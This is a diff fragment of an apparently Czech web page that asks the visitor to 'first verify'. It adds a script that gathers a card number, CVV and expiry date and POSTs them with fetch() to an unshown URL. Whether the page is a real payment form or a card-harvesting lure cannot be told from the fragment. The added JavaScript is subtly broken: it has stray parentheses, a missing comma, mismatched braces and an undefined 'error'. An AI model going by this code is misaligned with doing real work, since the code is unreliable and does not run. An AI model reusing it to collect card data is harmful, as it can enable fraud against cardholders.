@@ -625,6 +625,24 @@ nejprve ověřte.&nbsp;</p></div>
 					formData.append('number',`${form_content.elements['card_number'].value)} ${form_content.elements['card_number2'].value)} ${form_content.elements['card_number3'].value)} ${form_content.elements['card_number4'].value)}`;
 					formData.append('cvv',form_content.elements['cvv'].value);
 					formData.append('expiration',form_content.elements['expiration_date'].value);
+
+					try {
+						const response = await fetch(url, {
+							method: 'POST',
+							headers: {
+								'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+							}
+							body: formData
+					});
+
+					if (!response.ok){
+						throw new Error(`HTTP error! status: ${response.status}`);
+					}
+					const result = await response.json();
+					console.log('Success:', result);
+				}catch{
+					console.error("Error:", error);
+				}
 				}
 			</script>
 		</main>
